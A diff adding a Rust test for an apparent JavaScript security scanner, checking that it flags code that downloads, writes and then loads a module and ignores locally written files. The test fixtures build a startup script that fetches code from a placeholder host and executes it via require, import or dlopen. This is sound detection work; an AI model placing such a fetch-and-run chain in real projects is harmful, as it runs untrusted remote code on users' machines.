@@ -2291,6 +2291,70 @@ fn promise_file_write_then_spawn_is_a_download_chain() {
 }
 
 #[test]
+fn downloaded_module_loads_are_correlated_without_overflagging_static_files() {
+    let cases = [
+        ("require", "./payload.js", "require('./payload.js');"),
+        (
+            "dynamic-import",
+            "./payload.js",
+            "await import('./payload.js');",
+        ),
+        (
+            "dlopen",
+            "./payload.node",
+            "process.dlopen(module, './payload.node');",
+        ),
+    ];
+    for (label, target, load) in cases {
+        let root = temporary_directory(&format!("downloaded-module-{label}"));
+        fs::write(
+            root.join("package.json"),
+            br#"{"scripts":{"start":"node startup.js"}}"#,
+        )
+        .unwrap();
+        fs::write(
+            root.join("startup.js"),
+            format!(
+                "import {{ writeFile }} from 'node:fs/promises'; async function boot() {{ const response = await fetch('https://example.invalid/payload'); await writeFile('{target}', await response.text()); {load} }} boot();"
+            ),
+        )
+        .unwrap();
+
+        let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+        let finding = report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|finding| {
+                finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE" && finding["severity"] == "critical"
+            })
+            .unwrap_or_else(|| panic!("{label}: {}", report["findings"]));
+        assert!(finding["evidence"].to_string().contains("writeFile"));
+        assert!(finding["evidence"].to_string().contains("npm start"));
+        fs::remove_dir_all(root).unwrap();
+    }
+
+    let root = temporary_directory("ordinary-write-require");
+    fs::write(
+        root.join("main.js"),
+        b"const fs = require('fs'); fs.writeFileSync('./payload.js', 'module.exports = 1'); require('./payload.js');",
+    )
+    .unwrap();
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| { finding["id"] != "JS-DOWNLOAD-WRITE-EXECUTE" })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn temporary_path_downloads_match_the_same_symbolic_spawn_target() {
     let root = temporary_directory("temporary-path-write-spawn");
     fs::write(
